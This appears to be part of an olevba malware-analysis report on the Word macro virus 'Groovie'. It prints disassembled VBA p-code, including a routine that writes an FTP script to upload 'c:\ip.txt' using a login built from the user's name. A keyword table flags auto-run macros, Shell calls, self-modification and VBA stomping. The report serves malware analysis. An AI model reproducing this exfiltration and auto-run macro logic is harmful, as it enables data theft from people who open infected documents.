' 	ArgsCall Shell 0x0002 
' Line #167:
' 	EndFunc 
' Line #168:
' 	FuncDefn (Function mscript(strFile As String))
' Line #169:
' 	ArgsCall Read 0x0000 
' Line #170:
' 	OnError (Resume Next) 
' Line #171:
' 	Ld Application 
' 	MemLd UserName 
' 	St one 
' Line #172:
' 	Ld Application 
' 	MemLd UserInitials 
' 	St two 
' Line #173:
' 	Ld Rnd 
' 	LitDI2 0x03E7 
' 	Mul 
' 	FnInt 
' 	St rn 
' Line #174:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #175:
' 	Ld Friend 
' 	St hFile 
' Line #176:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #177:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "anonymous"
' 	PrintItemNL 
' Line #178:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld one 
' 	LitStr 0x0001 "@"
' 	Concat 
' 	Ld two 
' 	Concat 
' 	LitStr 0x0004 ".com"
' 	Concat 
' 	PrintItemNL 
' Line #179:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "cd incoming"
' 	PrintItemNL 
' Line #180:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "send"
' 	PrintItemNL 
' Line #181:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "c:\ip.txt"
' 	PrintItemNL 
' Line #182:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld rn 
' 	Ld rn 
' 	Add 
' 	LitStr 0x0001 "."
' 	Concat 
' 	Ld two 
' 	Concat 
' 	PrintItemNL 
' Line #183:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #184:
' 	Ld hFile 
' 	Close 0x0001 
' Line #185:
' 	EndFunc 
' Line #186:
' 	FuncDefn (Sub viewvbcode())
' Line #187:
' 	LitStr 0x000C "It's GROOVIE"
' 	Ld vbOKOnly 
' 	LitStr 0x0015 "•  ALT-F11  • says..."
' 	ArgsCall MsgBox 0x0003 
' Line #188:
' 	EndSub 
' Line #189:
' 	FuncDefn (Sub ToolsMacro())
' Line #190:
' 	EndSub 
' Line #191:
' 	FuncDefn (Sub FileTemplates())
' Line #192:
' 	EndSub 
' Line #193:
' 	FuncDefn (Function Check_For_Doc())
' Line #194:
' 	OnError docek 
' Line #195:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #196:
' 	LitVarSpecial (True)
' 	St DocThere 
' Line #197:
' 	EndIfBlock 
' Line #198:
' 	GoTo over 
' Line #199:
' 	Label docek 
' Line #200:
' 	LitVarSpecial (False)
' 	St DocThere 
' Line #201:
' 	Label over 
' Line #202:
' 	EndFunc 
' Line #203:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Groovie.w' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Booke
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Groovie.w' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Raleigh DmBd BT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Groovie.w' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Casper'S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Groovie.w' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Groovie.w' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WinK'S@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Groovie.w' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Groovie.w' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.Groovie.w' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN 'Virus.MSWord.Groovie.w' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

